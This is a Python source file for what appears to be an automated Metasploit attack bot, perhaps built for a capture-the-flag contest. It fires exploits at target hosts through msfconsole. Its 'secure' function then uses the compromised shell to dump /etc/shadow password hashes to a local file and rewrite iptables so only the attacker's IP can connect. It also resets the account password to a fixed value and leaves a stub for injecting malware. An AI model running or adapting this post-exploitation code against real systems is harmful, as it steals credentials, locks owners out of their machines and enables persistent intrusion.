import leftBottom_frame
import sys
import exploits
from time import sleep

printB = leftBottom_frame.print_bottom_panel
printLine = "---------------------------------------------\n"

def sploiter(bot, commands, host, exploit_name):
	msfconsole = bot.msfconsole

	printB("[+]Started exploit on host:" +str(host.id) + " with " + exploit_name + "\n")
	msfconsole.console_write(commands)
	res = msfconsole.console_read()

	print res
	printB("[*]msfconsole output\n"+ printLine +res)
	printB("[+]Finished exploit on host:" +str(host.id) + " with " + exploit_name + "\n")

def get_exploit(bot, exploit_name, host, lhost, lport):
	rhost = host.address
	commands = exploits.returnExploit(exploit_name, rhost, lhost, lport)
	sploiter(bot, commands, host, exploit_name)

   				
def secure(host, bot):
	printB("[+]Bot:"+str(bot.id)+" Securing host:" + str(host.id))
	msfconsole = bot.msfconsole
	myIP = bot.myhost_address
	shells = msfconsole.get_sessions()
	target_shell_id = None

	for i in shells.keys():
		shell = shells[i]
		if shell['target_host'] == host.address:
			target_shell_id = i
			break
			
	if target_shell_id != None:

		if host.os_family == "Linux":
			#-------drop hashes----------
			cmd = "cat /etc/shadow\n"
			try:
				msfconsole.session_write(target_shell_id, cmd)
				hashFile = open('/root/Desktop/shared/security/mikasa/records/hashes.txt', 'w+')
				hashes = msfconsole.session_read(target_shell_id)
				host.hashes = hashes
				hashFile.write(hashes)
				hashFile.close()
				printB("[+]Bot:"+str(bot.id)+" succesfully collected hashes from host:" + str(host.id))
			except:
				pass
				print "[-]Hashes not succesfully recovered."

			#-------change ipatables----------
			cmd = """iptables -F
			         iptables -I INPUT ! -s """+myIP+""" -j DROP
					 sudo /sbin/iptables-save
				     """

			try:
				msfconsole.session_write(target_shell_id, cmd)
				res = msfconsole.session_read(target_shell_id)
				printB("[+]Bot:"+str(bot.id)+" succesfully loaded iptables from host:" + str(host.id))
			except:
				pass
				print "[-]IP TABLES not succesfully recovered."

			#-------change password----------
			cmd = """passwd
			 		 mikasa
			 		 mikasa
			 		 """
			try:
				msfconsole.session_write(target_shell_id, cmd)
				res = msfconsole.session_read(target_shell_id)
				print res
				printB("[+]Bot:"+str(bot.id)+" succesfully changed password from host:" + str(host.id))
			except:
				pass
				print "[-]Password not succesfully recovered."

			#-------inject malware----------
			#http
		if host.os_family == "Windows":
			print "working on these windows post-exploitations"

	else:
		bot.busy = True 

	#http://unix.stackexchange.com/questions/145929/how-to-ensure-ssh-port-is-only-open-to-a-specific-ip-address